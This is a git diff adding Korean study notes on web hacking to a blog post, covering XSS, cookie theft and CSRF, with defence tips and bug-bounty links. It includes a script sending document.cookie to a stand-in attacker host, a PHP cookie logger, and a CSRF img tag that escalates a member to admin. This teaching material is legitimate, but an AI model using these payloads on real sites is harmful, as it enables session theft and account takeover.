@@ -1,5 +1,5 @@
 ---
-title: "[모각코]WebHacking(5강)"
+title: "[모각코]해킹 맛보기(2.6까지) & WebHacking(5강)"
 excerpt_separator: "<!--more-->"
 toc: true
 toc_sticky: true
@@ -8,6 +8,89 @@ categories:
 tags:
   - 모각코
   - Hacking
+---
+
+## 크로스 사이트 스크립팅
+
+### 크로스 사이트 스크립팅(XSS)
+
+- 웹 페이지에 스크립트를 삽입할 수 있는 취약점
+- JavaScript를 통해 공격이 이루어짐
+
+```
+msg 파라미터를 출력하는 xss.php 예제
+<?
+  echo $_GET['msg'];
+?>
+사용자가 입력한 값이 응답 페이지에서 실행되는 XSS 공격 방법을 Reflected XSS
+```
+
+- 대부분의 XSS 공격은 Stored XSS 방식
+
+  - 주로 게시판의 악성 스크립트가 삽입된 형태로 공격
+  - 사용자가 입력값을 그대로 저장해 출력하는 경우, 악의적인 사용자가 악성 스크립트 글을 작성하게 되고 다른 사용자가 해당 글을 읽게 되면 악성코드가 실행되는 방식
+  - `<script>` 와 같은 태그 사용이 가능하다면 _XSS_ 혹은 _CSRF_ 공격 취약점 존재
+
+### 쿠키 공격
+
+- **쿠키**
+
+  - 서버와 클라이언트를 매개해주는 역할
+  - 클라이언트 단의 기록서이므로 변조가 가능해 취약점 존재
+
+- **세션**
+
+  - 쿠키 인증 방식 대신 사용되는 인증 방식
+  - 서버에 저장되어 쿠키에 세션 이름 등록
+
+- 쿠키 탈취 공격 예시
+
+  - JavaScript에서 현재 페이지의 쿠키는 docuemnt.cookie에 담기며 이를 해커의 서버로 넘기면 쿠키 탈취
+  - 탈취 과정
+
+    1. 악성 스크립트 관리자에게 전송
+    2. 관리자가 이메일 확인하자마자 스크립트에 의해 해커의 서버로 쿠키 정보와 함께 이동
+    3. log.txt에 쿠키 정보 기록
+
+    ```
+    해커의 서버(http://hacker.example.com)로 클라이언트의 쿠키 전송
+    <script>
+      window.location = 'http://hacker.example.com/xss.php?log=' + document.cookie
+    </script>
+
+    파라미터를 log.txt에 저장하는 xss.php
+    <?
+      $fp = fopen("log.txt","a+");
+      fwrite($fp,$_GET['log']);
+      fclose($fp);
+    ?>
+    ```
+
+  - xss를 응용한 공격 방식들
+
+  ![xss 응용 공격](https://user-images.githubusercontent.com/66258691/126022559-eca8ac1b-588d-4afa-afe8-8fcd9027597f.jpg)
+
+### 사이트 간 요청 위조 공격(CSRF)
+
+- 사용자가 자신의 의지와는 무관하게 해커가 원하는 주소를 요청시키는 공격 기법
+- 예시
+
+  ![회원정보 (2)](https://user-images.githubusercontent.com/66258691/126022751-025f1f7e-93c1-425a-921f-fbdfc71c0b5a.jpg)
+
+  - 관리자가 페이지에서 버튼을 통해 회원정보수정을 하게되면 처리를 위해 `POST` 혹은 `GET` 메소드로 데이터를 전송
+    `http://example.com/admin/member_modify_ok.php?no=198&pass=1234&passre=1234&grade=1grade`
+  - 인자가 1일 때 일반, 2일 때 관리자 등급
+  - _쿠키 공격_ 예제에서 다음과 같은 img 태그를 심어 보내면 198번을 관리자 등급으로 변경하게 됨
+    `<img src= http://example.com/admin/member_modify_ok.php?no=198$pass=1234$passre=1234&grade=2`
+
+### 방어 기법
+
+- <> 를 엔티티 문자인 `&lt;`와 `&gt;` 로 치환해 태그를 막는 방법
+- 많은 공격 포인트가 존재하여 해당 취약점에 대한 완벽한 방어 기법 존재 하지 않음
+- 페이스북이나 구글은 자사 웹 사이트의 XSS 취약점을 발견하면 보상을 진행
+  - 페이스북: <https://facebook.com/whitehat/>
+  - 구글: <http://www.google.com/about/appsecurity/reward-program/>
+
 ---
 
 ## SQL Injection Advanced
